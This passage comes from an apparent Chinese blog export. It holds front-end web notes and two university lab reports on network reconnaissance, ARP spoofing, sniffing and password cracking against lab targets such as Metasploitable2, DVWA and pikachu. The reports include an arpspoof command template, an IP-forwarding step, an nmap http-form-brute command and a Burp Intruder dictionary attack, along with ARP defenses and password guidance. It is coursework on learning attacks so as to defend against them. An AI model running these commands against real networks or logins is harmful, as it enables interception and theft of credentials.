auto;&quot;&gt;123&lt;/div&gt; &lt;div style=&quot;border: 1px solid red; width: 500px;height: 200px; margin: 10px auto;&quot;&gt;456&lt;/div&gt; &lt;div style=&quot;border: 1px solid red; width: 500px;height: 200px; margin: 10px auto;&quot;&gt;789&lt;/div&gt; &lt;span style=&quot;border: 1px solid red; width: 500px;height: 200px; margin: 10px auto;&quot;&gt;555&lt;/span&gt; CSS引入方式​ 12345678910111213141516171819202122232425&lt;!--方式1 行内式 通过元素的的style属性引入式 语法：style=&quot;样式名：样式值;样式名:样式值......&quot;--&gt;&lt;button style=&quot;width: 60px;height: 40px; background-color: aqua; color: white;border-radius: 5px;&quot; class=&quot;butt&quot; id=&quot;2&quot;&gt;按钮&lt;/button&gt;&lt;!--方式2 内嵌式 通过head标签中的style定义本页面的公共样式 --&gt;button&#123; width: 60px;height: 40px; background-color: aqua; color: white;border-radius: 5px; &#125;&lt;!--方式3 外部样式表 将css代码单独放入.css文件中，html在head中通过link标签引入--&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;btn.css&quot;&gt; ​ css选择器12345678910111213141516&lt;!-- 元素选择器 --&gt;button&#123; width: 60px;height: 40px; background-color: aqua; color: white;border-radius: 5px; &#125;&lt;!-- id选择器 --&gt;#2&#123; width: 60px;height: 40px; background-color: aqua; color: white;border-radius: 5px;&#125;&lt;!-- class选择器 一个元素可以有多个class--&gt;.bott&#123; width: 60px;height: 40px; background-color: aqua; color: white;border-radius: 5px;&#125; css浮动123456789&lt;!--float 使多个div在同一行--&gt;&lt;div style=&quot;background-color: brown;height: 100px;&quot;&gt; &lt;div style=&quot;background-color: antiquewhite;float: right;&quot;&gt;123&lt;/div&gt; &lt;div style=&quot; background-color: beige;float: right;&quot;&gt;456&lt;/div&gt; &lt;div style=&quot;background-color: blue;float: right;&quot;&gt;789&lt;/div&gt; &lt;/div&gt; css定位12345678910111213141516&lt;!--position static 默认 relative 相对 对于元素原来位置 fixed 相对 固定在浏览器页面（页面滑动还是在页面原来位置） absolute 绝对 对于浏览器 left right top bottom--&gt;&lt;div style=&quot;height: 100px;&quot;&gt; &lt;div style=&quot;background-color: antiquewhite; position: fixed;bottom: 75px;&quot;&gt;123&lt;/div&gt; &lt;div style=&quot; background-color: beige;&quot;&gt;456&lt;/div&gt; &lt;div style=&quot;background-color: blue;position: relative;left: 75px;&quot;&gt;789&lt;/div&gt; &lt;/div&gt; css盒子模型12345678910111213&lt;!--Margin(外边距) - 清除边框外的区域，外边距是透明的。Border(边框) - 围绕在内边距和内容外的边框。Padding(内边距) - 清除内容周围的区域，内边距是透明的。Content(内容) - 盒子的内容，显示文本和图像。--&gt;div &#123; width: 300px; border: 25px solid green; padding: 25px; margin: 25px;&#125; js引入方式1234567891011121314151617&lt;!--1.内嵌式 在head中通过script标签定义脚本代码--&gt; &lt;script&gt; function suprise()&#123; alert(&quot;惊喜&quot;); &#125;&lt;/script&gt;&lt;button onclick=&quot;suprise()&quot;&gt;点我有惊喜&lt;/button&gt;&lt;!--2.引入外部脚本文件 在head中通过script引入外部js文件--&gt; &lt;script src=&quot;js/button.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt; 数据类型和变量1234567891011121314&lt;!--1.js中的变量声明都用var var a=10 var str=&quot;abc&quot;2.console.log 输出在控制台3.prompt 输入4.数据类型 数值类型 number 整数 小数 字符串 string 布尔类型 boolean 引用类型 Object 函数 function 变量先赋值后判断类型 --&gt; 运算符12345678910&lt;!--1.算数 + - * / %2.复合 ++ -- += -= *= /= %=3.关系 &gt; &lt; &gt;= &lt;= != == === == 如果两端的数据类型不一致，会尝试两端的数据类型都转换位number再对比 === 如果两端的数据类型不一致，直接返回false，相同则会返回true4.逻辑 $$ ||5.条件 条件表达式? 值1 : 值26.位 | &amp; ^ &gt;&gt; &lt;&lt; &gt;&gt;&gt;--&gt; 分支机构123456789101112131415161718192021&lt;!-- if else ---&gt;if()&#123;&#125;else if()&#123; &#125;else&#123; &#125;&lt;!-- switch --&gt;switch()&#123; case 1: break case 2: break case 3: break dafault:&#125; 循环结构123456789&lt;!-- while --&gt;while()&#123; &#125;&lt;!-- for --&gt;for()&#123; &#125; 函数12345&lt;!--1.函数声明 function 函数名()&#123;&#125; var 函数名=function()&#123;&#125;--&gt; 对象123456789101112131415161718192021222324252627282930&lt;!--对象的创建 1.new Object() 2.&#123;属性名:属性值,... ..., 函数名:fuinction()&#123;&#125;&#125;--&gt;var person=new Object() //添加属性 person.name=&#x27;张三&#x27; person.age=20 //添加方法 person.eat=function(food)&#123; console.log(name+&#x27;正在吃&#x27;+food) &#125; //访问属性 console.log(person.name) //调用方法 person.eat(&#x27;火锅&#x27;)var person=&#123; name:&#x27;张三&#x27;, age:20, eat:function(food)&#123; console.log(name+&#x27;正在吃&#x27;+food) &#125; &#125; //访问属性 console.log(person.name) //调用方法 person.eat(&#x27;火锅&#x27;) JSON12345678&lt;!--JSON格式 var personStr=&#x27;&#123;&quot;属性名1&quot;:&quot;属性值2&quot;,&quot;属性名2&quot;:&quot;属性值2&quot;,&quot;属性名&quot;:&#123;&#125;,&quot;属性名&quot;:[]&#125;&#x27;通过JSON.parse()可以将一个JSON串转换为一个对象 var person=JSON.parse(personStr)通过JSON.stringify()可以将一个对象转换为JSON串 var personStr=JSON.stringify(person)--&gt;","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"前端","slug":"开发/前端","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://example.com/tags/%E5%89%8D%E7%AB%AF/"}]},{"title":"实验二 网络嗅探与身份认证","slug":"实验二 网络嗅探与身份认证","date":"2023-12-20T09:42:06.014Z","updated":"2023-12-20T12:43:59.514Z","comments":true,"path":"2023/12/20/实验二 网络嗅探与身份认证/","permalink":"http://example.com/2023/12/20/%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/","excerpt":"","text":"实验二 网络嗅探与身份认证实验目的：1、通过使用Wireshark软件掌握Sniffer（嗅探器）工具的使用方法，实现捕捉HTTP等协议的数据包，以理解TCP&#x2F;IP协议中多种协议的数据结构、通过实验了解HTTP等协议明文传输的特性。 2、研究交换环境下的网络嗅探实现及防范方法，研究并利用ARP协议的安全漏洞，通过Arpspoof实现ARP欺骗以捕获内网其他用户数据。 3、能利用BrupSuite实现网站登录暴力破解获得登录密码。 4、能实现ZIP密码破解，理解安全密码的概念和设置。 系统环境：Kali Linux 2、Windows 网络环境：交换网络结构 实验工具：Arpspoof、WireShark、BurpSuite、fcrackzip（用于zip密码破解）。 实验原理：网络嗅探 1、网络嗅探概述 Sniffer（嗅探器）工作在OSI模型的第二层，利用计算机的网卡截获网络数据报文的一种工具，可用来监听网络中的数据，分析网络的流量，以便找出所关心的网络中潜在的问题。例如,假设网络的某一段运行得不是很好,报文的发送比较慢,而我们又不知道问题出在什么地方,此时就可以用嗅探器确定不同网络协议、不同用户的通信流量，相互主机的报文传送间隔时间等，这些信息为管理员判断网络问题、管理网络区域提供了非常宝贵的信息。 在正常情况下，一个合法的网络接口应该只响应这样的两种数据帧：帧的目标区域具有和本地网络接口相匹配的硬件地址；帧的目标区域具有“广播地址”。 如果网卡处于混杂（promiscuous）模式，那么它就可以捕获网络上所有的数据帧，处于对网络的“监听”状态，如果一台机器被配置成这样的方式，它（包括其软件）就是一个嗅探器。 在交换型以太网中，上述条件2是不满足的。所有的主机连接到SWITCH，SWITCH比HUB更聪明，它知道每台计算机的MAC地址信息和与之相连的特定端口，发给某个主机的数据包会被SWITCH从特定的端口送出，而不是象HUB那样，广播给网络上所有的机器。这种传输形式使交换型以太网的性能大大提高，同时还有一个附加的作用：使传统的嗅探器无法工作。 交换型网络环境嗅探的核心问题是：如何使本不应到达的数据包到达本地。通常的方法有MAC洪水包和ARP欺骗。其中MAC洪水包是向交换机发送大量含有虚构MAC地址和IP地址的IP包，使交换机无法处理如此多的信息，致使交换机就进入了所谓的”打开失效”模式，也就是开始了类似于集线器的工作方式，向网络上所有的机器广播数据包。 2、ARP欺骗 本实验中，我们将要详细分析ARP欺骗模式，并通过ARP欺骗达到交换网络嗅探的目的。 每一个主机都有一个ARP高速缓存，此缓存中记录了最近一段时间内其它IP地址与其MAC地址的对应关系。如果本机想与某台主机通信，则首先在ARP高速缓存中查找此台主机的IP和MAC信息，如果存在，则直接利用此MAC地址构造以太帧；如果不存在，则向本网络上每一个主机广播一个ARP请求报文，其意义是”如果你有此IP地址，请告诉我你的MAC地址”，目的主机收到此请求包后，发送一个ARP响应报文，本机收到此响应后，把相关信息记录在ARP高速缓存中，以下的步骤同上。 可以看出，ARP协议是有缺点的，第三方主机可以构造一个ARP欺骗报文，而源主机却无法分辨真假。如果发送者硬件地址字段填入攻击者的硬件地址，而发送者IP地址填入被假冒者的IP地址，那么就构造出了一个用于欺骗的ARP请求报文。那么被欺骗主机的ARP高速缓存，被假冒者的IP地址与其MAC地址的对应关系就会更改为欺骗者的，从而达到ARP欺骗的目的。特别的，如果攻击者冒充网关，将转发子网内到外网的所有通信量，以达到捕获其他主机的通信量，从而破坏数据传输的保密性。 3、密码（口令，Password）安全 在现实网络中，攻击事件发生的频率越来越高，其中相当多的都是由于网站密码泄露的缘故，或是人为因素导致，或是口令遭到破解，所以从某种角度而言，密码的安全问题不仅仅是技术上的问题，更主要的是人的安全意识问题。 3.1、口令破解方法 口令破解主要有两种方法：字典破解和暴力破解。 字典破解是指通过破解者对管理员的了解，猜测其可能使用某些信息作为密码，例如其姓名、生日、电话号码等，同时结合对密码长度的猜测，利用工具来生成密码破解字典。如果相关信息设置准确，字典破解的成功率很高，并且其速度快，因此字典破解是密码破解的首选。 而暴力破解是指对密码可能使用的字符和长度进行设定后（例如限定为所有英文字母和所有数字，长度不超过8），对所有可能的密码组合逐个实验。随着可能字符和可能长度的增加，存在的密码组合数量也会变得非常庞大，因此暴力破解往往需要花费很长的时间，尤其是在密码长度大于10，并且包含各种字符（英文字母、数字和标点符号）的情况下。 3.2、口令破解方式 口令破解主要有两种方式：离线破解和在线破解。 离线破解攻击者得到目标主机存放密码的文件后，就可以脱离目标主机，在其他计算机上通过口令破解程序穷举各种可能的口令，如果计算出的新密码与密码文件存放的密码相同，则口令已被破解。 3.3 候选口令产生器 候选口令产生器的作用是不断生成可能的口令。有几种方法产生候选口令，一种是用枚举法来构造候选口令（暴力破解），另一种方法是从一个字典文件里读取候选口令（字典破解）。 3.4 口令加密 口令加密过程就是用加密算法对从口令候选器送来的候选口令进行加密运算而得到密码。这要求加密算法要采用和目标主机一致的加密算法。加密算法有很多种，通常与操作系统或应用程序的类型和版本相关。 Burp Suite是一个用于测试Web应用程序安全性的图形工具。该工具使用Java编写，由PortSwigger Security开发。该工具有两个版本。可免费下载的免费版（免费版）和试用期后可购买的完整版（专业版）。免费版本功能显着降低。它的开发旨在为Web应用程序安全检查提供全面的解决方案，Burp Suite是进行Web应用安全测试集成平台。它将各种安全工具无缝地融合在一起，以支持整个测试过程中，从最初的映射和应用程序的攻击面分析，到发现和利用安全漏洞。 实验步骤和内容：网络嗅探部分：网络嗅探：Wireshark 监听网络流量，抓包。 ARP欺骗： ArpSpoof，实施ARP欺骗。 防范： 防范arp欺骗。 实验网络拓扑 1、A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)。回答：先设置 “echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward” 使目标ip正常上网 再使用arp欺骗 使用wirkeshack抓取目标流量包 1.1 写出以上过滤语句。回答：ip.src&#x3D;&#x3D;192.168.30.91 1.2 在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，B是否能看到A和外网（该网站）的通信（A刚输入的帐户和口令）？为什么？ 回答：不能。因为， B的wireshark不在混杂模式下，所有的主机连接到SWITCH，SWITCH知道每台计算机的MAC地址和与之相连的特定端口，发给某个主机的数据包会被SWITCH从特定的端口送出，所以B不能得到A的外网通信。 2.1 为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？回答：B冒充网关 2.2 写出arpspoof命令格式。回答：arpspoof -i 网卡 -t 目标IP 网关 2.3 B是否能看到A和外网的通信（A输入的帐户和口令）？截图Wireshark中显示的明文信息。回答：（由于实验课结束，A换人，A的IP更改为192.168.30.194）A登陆pikachu，B抓包得到账号&#x2F;密码admin&#x2F;123456 FTP数据还原部分：利用WireShark打开实验实验数据data.pcapng。 3.1 FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？回答：192.168.182.1 FTP ip地址为192.168.182.1 因为请求方一直是192.168.182.132，回应方一直是192.168.182.132 3.2客户端登录FTP服务器的账号和密码分别是什么?回答：student&#x2F;sN46i5y 3.3 客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？*提示：文件名有可能是中文。*回答：1.zip和复习.Txt 3.4 还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。回答：将数据流另存为1.zip 再使用Ziperello暴力破解得到密码123456 得到一张企鹅图片 3.5 TXT文件的内容是什么？ 4、网站登录密码 利用人们平时常用的词、句破译，如果说暴力破解是一个一个的尝试那么字典破译就是利用人们习惯用人名、地名或者常见的词语设置成密码的习惯进行破译。字典破译速度比暴力破译更快但是有时候密码设置中包含了没有字典库中的词句就无法破解出来了，因此有好的字典是关键。 以pikachu为目标网站，构造字典（wordlist），其中包含你的正确密码，利用burpsuite进行字典攻击，实施字典攻击，你是如何判断某个密码为破解得到的正确密码，截图。 回答：随便输入账号和密码 通过bp抓包 发送到intruder并添加攻击位置，设置攻击方式为clusterbomb 导入字典并开始攻击 通过字典爆破得admin&#x2F;123456 5、MD5破解 SqlMap得到某数据库用户表信息，用户口令的MD5值为7282C5050CFE7DF5E09A33CA456B94AE 那么，口令的明文是什么？（提示：MD5值破解） 6、John the Ripper的作用是什么？ 回答：John the Ripper是一个密码破解工具，用于测试和评估密码的安全性。它可以通过多种方式破解密码，包括暴力破解、字典攻击和彩虹表攻击等。John the Ripper主要用于渗透测试和密码审计，帮助管理员评估系统中的弱密码并采取相应的安全措施。然而，请注意，使用John the Ripper或其他密码破解工具来未经授权地入侵他人系统是非法的行为。 思考问题：1、 谈谈如何防止ARP攻击。a.使用静态ARP表： 在网络中使用静态ARP表，将IP地址与MAC地址进行手动绑定。这样可以防止攻击者通过发送虚假的ARP响应来欺骗其他设备。 b.使用ARP防火墙： 部署ARP防火墙可以检测和阻止异常的ARP流量。这些防火墙可以监控网络上的ARP请求和响应，识别异常模式，并采取相应的阻止措施。 c.网络流量监测：实施网络流量监测工具，监控网络中的ARP请求和响应。异常的ARP流量模式可能表明ARP攻击正在发生。 c.端口安全特性： 使用交换机的端口安全特性，限制每个端口上允许的MAC地址数量。这可以防止攻击者通过在网络上发送大量虚假的ARP响应来引发混乱。 d.启用802.1X认证： 802.1X认证要求所有连接到网络的设备进行身份验证。只有通过身份验证的设备才能参与网络通信，从而减少了ARP攻击的风险。 e.使用VPN： 如果可能，使用虚拟专用网络（VPN）可以加密通信，使得攻击者更难截获和篡改网络通信。 f.定期审查ARP表： 管理员可以定期审查网络设备的ARP表，检查是否存在异常的或重复的条目。发现异常情况时，可以采取纠正措施。 g.网络安全培训： 对网络用户和管理员进行网络安全培训，使其了解ARP攻击的风险，并教导采取预防措施。 2、 安全的密码（口令）应遵循的原则。a.长度： 使用足够长度的密码，一般来说，密码长度越长越安全。推荐至少12个字符。 b.复杂性： 包含不同类型的字符，包括大写字母、小写字母、数字和特殊字符（例如！、@、#、$等）。 c.避免常见词语： 避免使用容易猜测的密码，如常见单词、词典单词、生日、名字等。攻击者可能使用字典攻击来猜测这些密码。 d.不重复使用： 对于不同的账户和服务，请使用不同的密码。这样，如果一个账户受到攻击，其他账户仍然安全。 e.定期更改： 定期更改密码以增加安全性。虽然不需要每个月都更改，但定期更改是一个好的安全实践。 f.避免个人信息： 避免在密码中使用与个人相关的信息，如姓名、生日、地址等。这些信息可能容易被猜测或获取。 g.密码管理器： 使用密码管理器来生成、存储和管理强密码。密码管理器可以帮助您记住复杂的密码，而不必在多个账户之间重复使用相同的密码。 h.双因素身份验证： 启用双因素身份验证，以提供额外的安全层。这通常涉及到除密码外的第二个身份验证步骤，例如手机验证码或硬件令牌。 h.教育和培训： 对用户进行安全培训，教育他们有关密码安全的最佳实践，以及如何识别和防范社会工程学攻击。 i.监控和更新： 定期监控账户活动，及时更新密码，特别是在发生数据泄露或安全事件后。 3、 谈谈字典攻击中字典的重要性。a.包含常见密码： 字典通常包含常见的、容易猜测的密码，如常见单词、数字组合、常见短语等。这些密码是攻击者最有可能尝试的。 b.多样性： 一个好的字典文件应该包含各种类型的密码，涵盖了可能出现的不同组合和模式。这包括大小写字母、数字、特殊字符以及它们的组合。 c.社会工程学元素： 一些字典可能包含基于社会工程学的信息，如常见的名字、生日、固定短语等，因为用户可能会使用与其个人信息相关的密码。 d.更新和维护： 随着时间的推移，密码的使用趋势和模式可能会发生变化。一个好的字典应该定期更新，以反映新的密码趋势和流行词汇。 e.攻击速度：字典攻击是一种高效的攻击方式，因为攻击者可以迅速尝试大量密码。一个包含大量可能密码的字典可以在短时间内覆盖广泛的选择。 f.组合和变种： 一些字典可能包含密码的组合和变种，例如通过在单词之间添加数字、特殊字符或重复字符。这增加了攻击的成功率。 f.密码生成规则： 字典文件可能包含密码生成规则，攻击者可以使用这些规则来生成更多可能的密码组合，而不仅仅是静态的字典列表。 g.定制字典： 攻击者可能会创建针对特定目标的定制字典，其中包含与目标相关的信息，如公司名、产品名、关键人物名字等。 4、 实验小结。（1）本次实验收获很大，了解了网络嗅探、ARP欺骗、密码安全等相关安全技术和问题。对相关安全和技术有了更加全面的了解。 （2）了解了ARP欺骗技术，让我们更深入了解了网关的作用，和wireshark的使用。同时，也告诉了我们，网站使用明文的方式传输密码是非常危险的，若用户遭受了arp欺骗，则很容易造成密码的泄露。 （3）ftp数据还原的部分，让我们更加熟悉了数据的获取，以及wireshark的使用，同时也对服务器有了一定的了解。 （4）密码的破解方面，让我们了解了使用弱口令很容易就被破解，破解密码的方式和工具也有很多种，熟悉了对zip文件的密码的破解，同时也熟悉了brupsuite的使用，利用brupsuite实现了对网站登录密码的暴力破解，更加理解了浏览器的原理，以及brupsuite的使用。","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"实验","slug":"安全/网络渗透测试/实验","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E9%AA%8C/"}],"tags":[{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"}]},{"title":"实验一 网络扫描与网络侦察","slug":"实验一 网络扫描与网络侦察","date":"2023-12-10T13:57:39.142Z","updated":"2023-12-23T14:49:39.585Z","comments":true,"path":"2023/12/10/实验一 网络扫描与网络侦察/","permalink":"http://example.com/2023/12/10/%E5%AE%9E%E9%AA%8C%E4%B8%80%20%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/","excerpt":"","text":"实验一 网络扫描与网络侦察1. 实验目的和要求实验目的：理解网络扫描、网络侦察的作用；通过搭建网络渗透测试平台，了解并熟悉常用搜索引擎、扫描工具的应用，通过信息收集为下一步渗透工作打下基础。 系统环境：Kali Linux 2、Windows 网络环境：交换网络结构 实验工具： Metasploitable2（需自行下载虚拟机镜像）；Nmap（Kali）；WinHex、数据恢复软件等 2.实验原理：1、网络扫描与网络侦察的目的黑客在进行一次完整的攻击之前除了确定攻击目标之外，最主要的工作就是收集尽量多的关于攻击目标的信息。这些信息主要包括目标的操作系统类型及版本、目标提供哪些服务、各服务的类型、版本以及相关的社会信息。 攻击者搜集目标信息一般采用七个基本的步骤： （1） 找到初始信息，比如一个IP地址或者一个域名； （2） 找到网络地址范围，或者子网掩码； （3） 找到活动机器； （4） 找到开放端口和入口点； （5） 弄清操作系统； （6） 弄清每个端口运行的是哪种服务； （7） 找到目标可能存在的漏洞。 2、Google Hacking（或baidu）Google Hacking 是利用谷歌搜索的强大，来在浩瀚的互联网中搜索到我们需要的信息。轻量级的搜索可以搜素出一些遗留后门，不想被发现的后台入口，中量级的搜索出一些用户信息泄露，源代码泄露，未授权访问等等，重量级的则可能是mdb文件下载，CMS 未被锁定install页面，网站配置密码，php远程文件包含漏洞等重要信息。 3、BASE64编码BASE64是一种编码方式，通常用于把二进制数据编码为可写的字符形式的数据。 编码后的数据是一个字符串，其中包含的字符为：A-Z、a-z、0-9、+、&#x2F;共64个字符。（其实是65个字符，“&#x3D;”是填充字符）。 长度为3个字节(38)的数据经过Base64编码后就变为4个字节(46)。 如果数据的字节数不是3的倍数，则其位数就不是6的倍数，那么就不能精确地划分成6位的块。需在原数据后面添加1个或2个零值字节，使其字节数是3的倍数。 字符串“Xue”经过Base64编码后变为“WHVl”。 字符串“Xu”经过Base64编码后变为“WHU&#x3D;”。 字符串“X”经过Base64编码后变为“WA&#x3D;&#x3D;”。 4、NmapNmap是一个网络侦察和安全扫描程序，系统管理者和个人可以使用这个软件扫描大型的网络，获取哪台主机正在运行以及提供什么服务等信息。Nmap支持很多扫描技术，例如：UDP、TCP connect()、TCP SYN(半开扫描)、ftp代理(bounce攻击)、反向标志、ICMP、FIN、ACK扫描、圣诞树(Xmas Tree)、SYN扫描和null扫描。Nmap还提供了一些高级的特征，例如：通过TCP&#x2F;IP协议栈特征探测操作系统类型，秘密扫描，动态延时和重传计算，并行扫描，通过并行ping扫描探测关闭的主机，诱饵扫描，避开端口过滤检测，直接RPC扫描(无须端口映射)，碎片扫描，以及灵活的目标和端口设定。 Nmap运行通常会得到被扫描主机端口的列表。Nmap总会给出well known端口的服务名(如果可能)、端口号、状态和协议等信息。每个端口的状态有：open、filtered、unfiltered。open状态意味着目标主机能够在这个端口使用accept()系统调用接受连接。filtered状态表示：防火墙、包过滤和其它的网络安全软件掩盖了这个端口，禁止Nmap探测其是否打开。unfiltered表示：这个端口关闭，并且没有防火墙&#x2F;包过滤软件来隔离nmap的探测企图。通常情况下，端口的状态基本都是unfiltered状态，只有在大多数被扫描的端口处于filtered状态下，才会显示处于unfiltered状态的端口。 根据使用的功能选项，Nmap也可以报告远程主机的下列特征：使用的操作系统、TCP序列、运行绑定到每个端口上的应用程序的用户名、DNS名、主机地址是否是欺骗地址、以及其它一些东西。 5、WinHexWinHex 是一款以通用的 16 进制编辑器为核心，专门用来对付计算机取证、数据恢复、低级数据处理、以及 IT 安全性、各种日常紧急情况的高级工具： 用来检查和修复各种文件、恢复删除文件、硬盘损坏、数码相机卡损坏造成的数据丢失等。 3. 实验步骤1、用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。 2、照片中的女生在哪里旅行？截图搜索到的地址信息。 回答：使用搜索引擎得到地址，再通过谷歌地图找到门店（需要调整时间） 3、手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。 获取自己手机的LAC和CID： Android 获取方法：Android： 拨号*##4636##*进入手机信息工程模式后查看 iphone获取方法：iPhone：拨号*3001#12345#*进入FieldTest Serving Cell info–&gt;LAC&#x3D;Tracking Area Code –&gt;cellid &#x3D; Cell identity 若不能获取，用右图信息。 截图你查询到的位置信息。 回答：使用右图信息 4、编码解码将Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;解码。截图。 回答： 5、地址信息5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。回答：该用户使用的设备为苹果品牌 该IP定位为“广西桂林市桂林电子科技大学” 5.2 访问https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因回答：不相同，原因： 我们能够上网靠的是isp组织分给我们的Ip地址，但是这个ip地址一般不是给个人的，一般都是给一个单位，一个区域的，也就是说我们实际上能接触到的一般都是私有地址，即我们用ipconig查到的都是私有地址，也就相当于局域网内的ip地址，当我们真正联网时，会先把数据发送到路由，然后再由路由进行处理实现真正的联网操作，路由的地址才是真正联网的Ip地址，也就是pubilc ip，而我们在自己电脑上查到的都是私有ip 6、NMAP使用6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能回答:通过NMAP扫描整个子网得到Metasploitable2的ip以及开发端口 其中 a.80端口为web服务 b.3306端口为MySQL数据库服务 C.21端口主要用于FTP（File Transfer Protocol，文件传输协议）服务。 FTP服务主要是为了在两台计算机之间实现文件的上传与下载，一台计算机作为FTP客户端，另一台计算机作为FTP服务器，可以采用匿名（anonymous）登录和授权用户名与密码登录两种方式登录FTP服务器。 d.22端口主要用于SSH(Secure SHell) SSH的英文全称是Secure SHell。通过使用SSH，你可以把所有传输的数据进行加密，这样“中间人”这种攻击方式就不可能实现了，而且也能够防止DNS和IP欺骗。还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替telnet，又可以为ftp、pop、甚至ppp提供一个安全的“通道” 6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图回答：扫描命令为“nmap -O +目标 IP” Metasploitable2的操作系统为linux 6.3 利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码回答：nmap -p80 –script http-form-brute –script-args http-form-brute.path&#x3D;&#x2F;dvwa&#x2F;login.php 192.168.154.142 -d 账号&#x2F;密码admin&#x2F;password 6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。回答：WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件，大小3.3MB，由不法分子利用NSA（National Security Agency，美国国家安全局）泄露的危险漏洞“EternalBlue”（永恒之蓝）进行传播 [1]。勒索病毒肆虐，俨然是一场全球性互联网灾难，给广大电脑用户造成了巨大损失。最新统计数据显示，100多个国家和地区超过10万台电脑遭到了勒索病毒攻击、感染。 [2]勒索病毒是自熊猫烧香以来影响力最大的病毒之一。WannaCry勒索病毒全球大爆发，至少150个国家、30万名用户中招，造成损失达80亿美元，已经影响到金融，能源，医疗等众多行业，造成严重的危机管理问题。中国部分Windows操作系统用户遭受感染，校园网用户首当其冲，受害严重，大量实验室数据和毕业设计被锁定加密。部分大型企业的应用系统和数据库文件被加密后，无法正常工作，影响巨大。 7、利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。回答：1. Apache Struts 目录遍历导致文件上传漏洞 Apache Struts是美国阿帕奇（Apache）软件基金会下属的Jakarta项目中的一个子项目，是一个基于MVC设计的Web应用框架。漏洞源于文件上传逻辑存在缺陷，攻击者可利用上传文件参数启动路径遍历，上传恶意文件，进而导致远程代码执行。 2.Apache ActiveMQ jolokia 远程代码执行漏洞 Apache ActiveMQ 中存在远程代码执行漏洞，具有 Apache ActiveMQ 服务器TCP端口（默认为61616）访问权限的远程攻击者可以通过发送恶意数据到服务器从而执行任意代码。 3.CVE-2019-0211 Apache Root Privilege Escalation 在MPM prefork中，以root身份运行的主服务器进程管理一个单线程、低权限（www-data）的工作进程池，用于处理HTTP请求。为了从工作进程那里获得反馈，Apache维护了一个共享内存区域（SHM）计分板，其中包含各种信息，例如工作进程的PID，以及它们处理的最后一个请求。每个工作进程都以维护与其PID相关联的process_score结构为目标，并且具有对SHM的完全读&#x2F;写访问权限。 8、Winhex简单数据恢复与取证8.1 elephant.jpg不能打开了，利用WinHex修复，说明修复过程。回答：文件类型为jpg文件，但文件头却为00 00 FF E0,jpg文件的文件头应为FF D8 FF E0,修改文件头得到图片 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849一、常见文件头文件尾1、图片JPEG 文件头：FF D8 FF 文件尾：FF D9TGA 未压缩的前4字节 00 00 02 00 RLE压缩的前5字节 00 00 10 00 00PNG 文件头：89 50 4E 47 0D 0A 1A 0A 文件尾：AE 42 60 82GIF 文件头：47 49 46 38 39(37) 61 文件尾：00 3BBMP 文件头：42 4D 文件头标识(2 bytes) 42(B) 4D(M)TIFF (tif) 文件头：49 49 2A 00ico 文件头：00 00 01 00Adobe Photoshop (psd) 文件头：38 42 50 532、office文件MS Word/Excel (xls.or.doc) 文件头：D0 CF 11 E0MS Access (mdb) 文件头：53 74 61 6E 64 61 72 64 20 4AWordPerfect (wpd) 文件头：FF 57 50 43Adobe Acrobat (pdf) 文件头：25 50 44 46 2D 31 2Eapplication/vnd.visio(vsd) 文件头：D0 CF 11 E0 A1 B1 1A E1Email [thorough only] (eml) 文件头：44 65 6C 69 76 65 72 79 2D 64 61 74 65 3AOutlook Express (dbx) 文件头：CF AD 12 FE C5 FD 74 6FOutlook (pst) 文件头：21 42 44 4ERich Text Format (rtf) 文件头：7B 5C 72 74 66txt 文件(txt) 文件头：Unicode：FE FF / Unicode big endian：FF FE / UTF-8：EF BB BF /ANSI编码是没有文件头的3、压缩包文件ZIP Archive (zip) 文件头：50 4B 03 04 